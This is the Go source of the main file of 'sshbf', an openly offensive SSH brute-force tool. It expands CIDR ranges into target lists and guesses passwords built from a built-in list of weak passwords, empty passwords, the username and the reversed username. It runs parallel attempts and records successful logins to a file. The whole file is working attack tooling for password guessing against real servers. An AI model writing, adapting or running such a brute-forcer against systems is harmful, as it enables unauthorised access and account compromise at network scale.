// sshbf is a simple SSH Brute-Forcer.

/*
 * sshbf.go
 * Simple SSH bruteforcer
 * by J. Stuart McMurray
 * created 20140717
 * last modified 20140801
 */

package main

import (
	"flag"
	"fmt"
	"github.com/kd5pbo/tslist"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"os"
	"strings"
	"time"
)

/* Used for removing hosts from the queue for a reason */
type badHost struct {
	Host   string
	Reason string
}

/* Internal password list */
var IPL []string = []string{"admin", "password", "1234", "12345", "123456",
	"test", "oracle"}

/* Default connect timeout */
var deftimeout string = "2m"
var retrywait string = "1s"

func main() {

	/* Slice of username/password combinations */
	templates := tslist.New()

	/* Initial list of passwords to guess */
	initpw := []string{}

	/* Command-line arguments */
	userf := flag.String("user", "", "Single SSH username.  If neither "+
		"this nor -ufile is specified, root will be used.")
	passf := flag.String("pass", "", "Single SSH password.  If neither "+
		"this nor -pfile is specified, a small internal list of "+
		"passwords will be attempted.  See -plist.")
	hostf := flag.String("host", "", "Host to attack.  This is, of "+
		"course, required.  Examples: foo.bar.com, "+
		"foo.baaz.com:2222.  Either this or -hfile must be "+
		"specified.  CIDR notation may be used to specify multiple "+
		"addresses at once.")
	ufilef := flag.String("ufile", "", "File with a list of usernames, "+
		"one per line.  If neither this nor -user is specified, the "+
		"single username root will be used.  This list will be "+
		"read into memory, so it should be kept short on low-memory "+
		"systems.")
	pfilef := flag.String("pfile", "", "File with a list of passwords, "+
		"one per line.  If neither this nor -pass is specified, a "+
		"small internal list of passwords will be attempted.  See "+
		"-plist.")
	hfilef := flag.String("hfile", "", "File with a list of hosts to "+
		"attack, one per line.  Either this or -host must be "+
		"specified.  This list will be read into memory, so it "+
		"should be kept short on low-memory systems.  CIDR notation "+
		"may be used to specify multiple addresses at once.")
	pnullf := flag.Bool("pnull", false, "Attempt the null (empty) "+
		"password as well as other specified passwords.")
	puserf := flag.Bool("puser", false, "Attempt the username as the "+
		"password as well as other specified passwords.")
	pbackf := flag.Bool("pback", false, "Attempt the username backwards "+
		"as the password as well as other specified passwords.  "+
		"E.g. root -> toor.")
	pdeflf := flag.Bool("pdefl", false, "Attempt the internal default "+
		"password list.")
	sshvsf := flag.String("sshvs", "SSH-2.0-sshbf_0.0.1", "SSH version "+
		"string to present to the server.")
	ntaskf := flag.Int("ntask", 4, "Number of attempts (tasks) to run in "+
		"parallel.  Don't set this too high.")
	triesf := flag.Bool("tries", false, "Print every guess.")
	stdinf := flag.Bool("stdin", false, "Ignore most of the above and "+
		"read tab-separated username<tab>password<tab>host lines from "+
		"stdin.  NOT CURRENTLY IMPLEMENTED.")
	plistf := flag.Bool("plist", false, "Print the internal default "+
		"password list and exit.")
	sfilef := flag.String("sfile", "", "Append successful "+
		"authentications to this file, which whill be flock()'d to "+
		"allow for multiple processes to write to it in parallel.")
	onepwf := flag.Bool("onepw", false, "Only find one username/password "+
		"pair per host.")
	errdbf := flag.Bool("errdb", false, "Print debugging information "+
		"relevant to errors made during SSH attempts.")
	pausef := flag.Duration("pause", 0, "Pause this long between "+
		"attempts.  Really only makes sense if -ntask=1 is used.")
	deftimeoutd, err := time.ParseDuration(deftimeout)
	if err != nil {
		fmt.Printf("Invalid default wait duration.\n\n.")
		fmt.Printf("This is a bad bug.\n\n")
		fmt.Printf("You should tell the developers.\n")
		os.Exit(-6)
	}
	waitf := flag.Duration("wait", deftimeoutd, "Wait this long for "+
		"authentication to succeed or fail.")
	flag.Parse()

	/* Print usage if no arguments */
	if len(os.Args) == 1 {
		flag.PrintDefaults()
	}

	/* If we're just printing the password list, do so and exit */
	if *plistf {
		fmt.Printf("Internal password list:\n")
		for _, p := range IPL {
			fmt.Printf("\t%v\n", p)
		}
		return
	}

	/* If we're to read from stdin, we can skip a lot of work */
	if *stdinf {
		/* TODO: Implement this */
		log.Printf("Reading from stdin not currently implemented.\n")
		os.Exit(-1)
	} else {
		/* Work out the list of targets and usernames */
		ft, err := readLines(*hostf, *hfilef)
		targets := []string{}
		if err != nil {
			log.Printf("Unable to read target hosts from %v: "+
				"%v.\n", *hfilef, err)
			os.Exit(-2)
		}
		/* Parse CIDR names */
		for _, t := range ft {
			/* Not CIDR */
			if !strings.ContainsRune(t, '/') {
				targets = append(targets, t)
				continue
			}
			/* CIDR */
			ip, in, err := net.ParseCIDR(t)
			/* Shouldn't happen, but typos happen. */
			if err != nil {
				log.Printf("%v does not appear to be CIDR "+
					"notation.  Adding it to target list "+
					"anyways.", t)
				targets = append(targets, t)
				continue
			}
			/* Add all addresses in netblock */
			for i := ip.Mask(in.Mask); in.Contains(i); incIP(i) {
				targets = append(targets, i.String())
			}
		}
		if len(targets) == 0 {
			log.Printf("Not enough target hosts specified.  " +
				"Please use -host and/or -hfile.\n")
			os.Exit(-4)
		}

		unames, err := readLines(*userf, *ufilef)
		if err != nil {
			log.Printf("Unable to read usernames from %v: %v.\n",
				*ufilef, err)
			os.Exit(-3)
		} else if len(unames) == 0 {
			/* Default to root only */
			unames = append(unames, "root")
		}

		/* Make sure the targets have ports */
		for i, t := range targets {
			if _, _, err := net.SplitHostPort(t); err != nil {
				targets[i] = net.JoinHostPort(t, "22")
			}
		}

		/* Make a list of passwordless ssh templates. */
		for _, u := range unames {
			for _, t := range targets {
				templates.PushBack(&template{User: u, Host: t})
			}
		}

		/* Work out a list of initial passwords */
		if *passf != "" { /* Password on command line */
			initpw = uniqueAppend(initpw, *passf)
		}
		if *pnullf { /* Use null password */
			initpw = uniqueAppend(initpw, "")
		}
		if *puserf { /* Username as password */
			for _, u := range unames {
				initpw = uniqueAppend(initpw, u)
			}
		}
		if *pbackf { /* Backwards username as password */
			for _, u := range unames {
				initpw = uniqueAppend(initpw, reverse(u))
			}
		}
		if *pdeflf { /* Internal default password list */
			for _, p := range IPL {
				initpw = uniqueAppend(initpw, p)
			}
		}
		if len(initpw) == 0 && *pfilef == "" { /* If all else fails */
			initpw = IPL
		}

	}

	/* File to which to append successes */
	var sf *os.File = nil
	if *sfilef != "" {
		sf, err = os.OpenFile(*sfilef,
			os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0644)
		if err != nil {
			fmt.Printf("Error opening success file %v: %v",
				*sfilef, err)
			os.Exit(-7)
		}
	}

	/* Message that we're starting */
	log.Printf("Trying %v Username/Host combinations.", templates.Len())

	/* Generate username/password/host attempts */
	internalc := make(chan attempt) /* Internal list */
	go internalAttemptMaker(templates, initpw, *sshvsf, internalc)

	filec := make(chan attempt) /* Password file */
	go fileAttemptMaker(templates, *pfilef, *sshvsf, filec)

	/* TODO: Read username\tpassword\thost tuples from stdin */
	stdinc := make(chan attempt) /* Standard input */
	go stdinAttemptMaker(stdinc) /* TODO: Implement this */

	/* Start broker */
	go broker(internalc, filec, stdinc, *ntaskf, sf, *triesf, *onepwf,
		*errdbf, *waitf, *pausef, templates)

	/* Derp derp derp */
	<-make(chan int)

	/* TODO: Use RemoveTemplates to remove unnecessary hosts */

}

/* incIP increments an IP Address */
func incIP(ip net.IP) {
	for i := len(ip) - 1; i >= 0; i-- {
		ip[i]++
		if ip[i] > 0 {
			break
		}
	}
}

/* maxIP tests if every byte in the IP address is 0xFF */
func maxIP(ip net.IP) bool {
	for _, b := range ip {
		if 0xFF != b {
			return false
		}
	}
	return true
}

///* Mark a user (u) and/or host (h) for removal from list of attempts.
//If either user or host is "", it will not be considered.  alock will be
//Lock()'d during the operation. */
//func xxremoveTemplates(l *list.List, u, h string, alock *sync.RWMutex) bool {
//	/* Sanity-check */
//	if u == "" && h == "" {
//		return true
//	}
//	removed := false /* True if we remove an item */
//	alock.Lock()
//	/* Iterate through list */
//	var next *list.Element
//	for e := l.Front(); e != nil; e = next {
//		next = e.Next()
//		/* Type-convert */
//		if t, ok := e.Value.(*attempt); ok &&
//			((u == "") || (t.User == u)) &&
//			((h == "") || (t.Host == h)) {
//			//!t.Remove {
//			//t.Remove = true
//			removed = true
//		}
//	}
//	alock.Unlock()
//	return removed
//}

///* attemptMaker spews out attempts on attemptc based on the username/host pairs
//in templates, which will be read only after calling RLock on alock.  It will
//first cycle through the passwords in initpw, then read lines of pwfile for the
//passwords. cv is used as the SSH client version. */
//func xxattemptMaker(templates *list.List, initpw []string, pwfile string,
//	attemptc chan attempt, alock *sync.RWMutex, cv string) {
//
//	/* For each password in initpw */
//	for _, p := range initpw {
//		if !broadcastPassword(p, templates, alock, attemptc, cv) {
//			goto NoTargets
//		}
//	}
//
//NoPasswords:
//	/* If we're here, we're out of things to try. */
//	log.Printf("Out of passwords.  Giving remaining attempts time to " +
//		"complete.\n")
//
//	/* Tell tasks they can die now. */
//	doneA(true, true)
//	//log.Printf("doneA %v - %v", doneA(false, false), nA()) /* DEBUG */
//
//	goto Done
//NoTargets:
//	log.Printf("Out of targets.  Giving remaining attempts time to " +
//		"complete.")
//Done:
//	return
//}
//
///* broadcastPassword sends a password out on attemptc for all templates in
//templates.  alock will be Locked before templates is read.  cv is used as the
//SSH client version.  Returns false if templates is empty. */
//func xxbroadcastPassword(password string, templates *list.List,
//	alock *sync.RWMutex, attemptc chan attempt, cv string) bool {
//	/* Give up if the list is empty */
//	if templates.Len() == 0 {
//		return false
//	}
//	/* Get the first template element */
//	alock.RLock()
//	e := templates.Front()
//	alock.RUnlock()
//
//	/* Give up if there's no more templates */
//	if e == nil {
//		return false
//	}
//
//	var n *list.Element
//	/* Cycle through good elements */
//	for ; e != nil; e = n {
//		alock.RLock()
//		n = e.Next()
//		alock.RUnlock()
//		/* Get the template */
//		t, ok := e.Value.(*attempt)
//		if !ok {
//			log.Printf("Undetermined corruption of " +
//				"username/host list.  Please report as a bug.")
//			os.Exit(-8)
//		}
//		/* Remove elements marked for removal */
//		if t.Remove {
//			alock.Lock()
//			//log.Printf("Removing %v - %v", t, nA()) /* DEBUG */
//			templates.Remove(e)
//			alock.Unlock()
//			continue
//		}
//		/* If there's no templates left, we're done */
//		alock.RLock()
//		if templates.Len() == 0 {
//			log.Printf("No targets left in queue.")
//			os.Exit(0)
//		}
//		alock.RUnlock()
//		a := t.New(password, cv)
//		//log.Printf("incA New %v - %v", a, nA()) /* DEBUG */
//		incA()
//		attemptc <- a
//		//log.Printf("Sent attempt: %v - %v", a, nA()) /* DEBUG */
//	}
//
//	return templates.Len() != 0
//}

/* Read lines from the file named file into a deduped, in-order slice,
optionally starting with leader if it is not the empty string.  It is not an
error if file is the empty string (in which case a slice containing only leader
will be returned), but it is an error if file cannot be read.  Windows line
endings may do strange things. */
func readLines(leader, file string) ([]string, error) {
	/* Initial collections */
	m := map[string]bool{}
	s := []string{}

	/* Add leader if it's not empty */
	if leader != "" {
		m[leader] = true
		s = append(s, leader)
	}

	/* Read from file if we have it */
	if file != "" {
		bytes, err := ioutil.ReadFile(file)
		if err != nil {
			return s, err
		}
		/* Remove single trailing newline (to prevent always having a
		   blank string */
		if bytes[len(bytes)-1] == '\n' {
			bytes = bytes[:len(bytes)-1]
		}
		/* Split the contents of the file into lines, append each
		   unique line */
		for _, h := range strings.Split(string(bytes), "\n") {
			/* Add the line if we don't already have it */
			if _, in := m[h]; !in {
				m[h] = true
				s = append(s, h)
			}
		}
	}
	return s, nil
}

/* reverse reverses a string */
func reverse(s string) string {
	// Get Unicode code points.
	n := 0
	rune := make([]rune, len(s))
	for _, r := range s {
		rune[n] = r
		n++
	}
	rune = rune[0:n]
	// Reverse
	for i := 0; i < n/2; i++ {
		rune[i], rune[n-1-i] = rune[n-1-i], rune[i]
	}
	// Convert back to UTF-8.
	return string(rune)
}

/* uniqueAppend appends a string to a slice only if the slice doesn't contain
the string.  Since it searches in O(n) time, it should only be used for
reasonably small slices */
func uniqueAppend(slice []string, s string) []string {
	/* Make sure s isn't in slice */
	for _, val := range slice {
		if val == s {
			return slice
		}
	}
	return append(slice, s)
}

/* randDuration generates a random duration less than s, which should be
a string allowed by time.ParseDuration */
func randDuration(s string) (time.Duration, error) {
	/* Get the max */
	d, err := time.ParseDuration(s)
	if err != nil {
		return d, err
	}
	/* Make a smaller duration */
	m := rand.Int63n(int64(d))
	/* Return it as a duration */
	return time.Duration(m), nil
}
